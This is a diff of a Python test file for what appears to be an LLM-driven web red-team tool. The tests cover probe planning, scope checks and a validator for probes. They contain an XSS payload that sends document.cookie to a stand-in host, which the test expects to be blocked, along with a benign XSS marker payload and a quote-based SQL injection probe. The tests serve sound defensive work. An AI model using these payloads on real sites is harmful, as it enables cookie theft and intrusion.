@@ -25,16 +25,18 @@ from medflow_redteam.generated_tools import load_generated_tool_specs, resolve_g
 from medflow_redteam.identity import analyze_identity_logs
 from medflow_redteam.metasploit_runner import first_interesting_line, has_command_output_proof, payload_attempts
 from medflow_redteam.tools import normalize_validation_status, route_technology_signals, web_control_checks
+from medflow_redteam.web_executor import validate_probe
+from medflow_redteam.web_reasoner import plan_web_probes
 from medflow_redteam.web_app import (
     WebAuthContext,
     WebParam,
     WebRoute,
     build_request,
-    classify_parameter,
     extract_client_routes,
     extract_robots_routes,
     redact_auth_context,
     response_signals,
+    run_web_assessment,
     run_idor_confirmation,
     persist_web_observation_graph,
     run_safe_web_probes,
@@ -125,40 +127,99 @@ class RedTeamCoreTests(unittest.TestCase):
         self.assertNotIn("spring", signals)
         self.assertNotIn("struts", signals)
 
-    def test_web_app_graph_and_safe_probes(self) -> None:
+    def test_web_app_graph_and_llm_evidence(self) -> None:
         route = WebRoute(
             url="http://172.29.10.10:8080/item?id=1&q=test",
             status=200,
             title="Search",
             params=[
-                WebParam("id", "query", "1", classify_parameter("id", "1")),
-                WebParam("q", "query", "test", classify_parameter("q", "test")),
+                WebParam("id", "query", "1"),
+                WebParam("q", "query", "test"),
             ],
         )
-        self.assertIn("object_id", route.params[0].classifications)
-        self.assertIn("sql_like", route.params[0].classifications)
-        self.assertIn("reflected_input", route.params[1].classifications)
-
-        def fake_fetch(url: str, auth_context: WebAuthContext | None = None) -> dict:
-            if "MEDFLOW_XSS_MARKER" in url:
-                return {"ok": True, "body": f"<html>{url}</html>"}
-            if "%27" in url or "'" in url:
-                return {"ok": True, "body": "SQL syntax error near quote MySQL"}
-            return {"ok": True, "body": "<html>baseline</html>"}
-
-        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
-            findings = run_safe_web_probes([route])
-        finding_types = {finding.type for finding in findings}
-        self.assertIn("sqli_error_signal", finding_types)
-        self.assertIn("xss_reflection_signal", finding_types)
-        self.assertIn("idor_candidate", finding_types)
+        analyst_finding = {
+            "type": "sqli_differential_signal",
+            "severity": "medium",
+            "confidence": "medium",
+            "url": route.url,
+            "parameter": "id",
+            "evidence": "Planner probe produced a database error response.",
+            "proof": "Redacted response evidence.",
+            "cwe": "CWE-89",
+            "owasp": "A03:2021-Injection",
+            "status": "suspected",
+        }
+        with patch("medflow_redteam.web_app.assess_web_observations", return_value=[analyst_finding]):
+            findings = run_safe_web_probes([route], use_llm=True, probe_results=[{"kind": "sqli", "status": "completed"}])
+        self.assertEqual(findings[0].type, "sqli_differential_signal")
 
         with tempfile.TemporaryDirectory() as tmp:
             graph = persist_web_observation_graph("172.29.10.10", [8080], [route], findings, Path(tmp) / "web_graph.json")
             summary = graph.summary()
             self.assertGreaterEqual(summary.get("nodes_route", 0), 1)
             self.assertGreaterEqual(summary.get("nodes_parameter", 0), 2)
-            self.assertGreaterEqual(summary.get("nodes_finding", 0), 3)
+            self.assertGreaterEqual(summary.get("nodes_finding", 0), 1)
+
+    def test_bounded_executor_rejects_unsafe_xss_payload(self) -> None:
+        known = {"http://lab/search?q="}
+        allowed = validate_probe(
+            {
+                "kind": "xss_dom",
+                "url": "http://lab/search?q=",
+                "method": "GET",
+                "parameter": "q",
+                "payload": "<img src=x onerror=\"document.title='MEDFLOW_DOM_XSS'\">",
+            },
+            known,
+        )
+        blocked = validate_probe(
+            {
+                "kind": "xss_dom",
+                "url": "http://lab/search?q=",
+                "method": "GET",
+                "parameter": "q",
+                "payload": "<script>fetch('https://example.test/?x='+document.cookie);document.title='MEDFLOW_DOM_XSS'</script>",
+            },
+            known,
+        )
+        self.assertIsNotNone(allowed)
+        self.assertIsNone(blocked)
+
+    def test_llm_web_planner_only_accepts_observed_routes(self) -> None:
+        context = {
+            "routes": [{"url": "http://lab/search?q=", "query_parameters": ["q"]}],
+            "browser": {"available": True, "pages": [], "requests": []},
+        }
+        raw = json.dumps(
+            {
+                "probes": [
+                    {"kind": "sqli", "url": "http://lab/search?q=", "method": "GET", "parameter": "q", "payload": "'"},
+                    {"kind": "sqli", "url": "http://outside.test/", "method": "GET", "parameter": "q", "payload": "'"},
+                ]
+            }
+        )
+        with patch("medflow_redteam.web_reasoner.call_redteam_llm", return_value=raw):
+            probes = plan_web_probes(context, "llama")
+        self.assertEqual(len(probes), 1)
+        self.assertEqual(probes[0]["url"], "http://lab/search?q=")
+
+    def test_web_assessment_connects_collector_planner_executor_and_analyst(self) -> None:
+        route = WebRoute(url="http://lab/search?q=", status=200, content_type="application/json", params=[WebParam("q", "query")])
+        plan = [{"kind": "sqli", "url": route.url, "method": "GET", "parameter": "q", "payload": "'", "body": {}}]
+        results = [{"kind": "sqli", "url": route.url, "status": "completed", "baseline": {"status": 200}, "probe": {"status": 500}}]
+        analyst = [{"type": "sqli_signal", "severity": "medium", "confidence": "medium", "url": route.url, "evidence": "Observed differential.", "proof": "HTTP response changed.", "status": "suspected"}]
+        with (
+            patch("medflow_redteam.web_app.crawl_web", return_value=[route]),
+            patch("medflow_redteam.web_app.collect_browser_observations", return_value={"available": True, "pages": [], "requests": []}),
+            patch("medflow_redteam.web_app.plan_web_probes", return_value=plan),
+            patch("medflow_redteam.web_app.execute_planned_probes", return_value=results),
+            patch("medflow_redteam.web_app.assess_web_observations", return_value=analyst),
+        ):
+            assessment = run_web_assessment("127.0.0.1", [8080], use_kb=False, use_llm=True)
+        self.assertTrue(assessment["browser_observations"]["available"])
+        self.assertEqual(assessment["planned_probes"], plan)
+        self.assertEqual(assessment["probe_results"], results)
+        self.assertEqual(assessment["findings"][0]["type"], "sqli_signal")
 
     def test_web_appsec_seed_documents_load(self) -> None:
         docs = load_seed_documents()
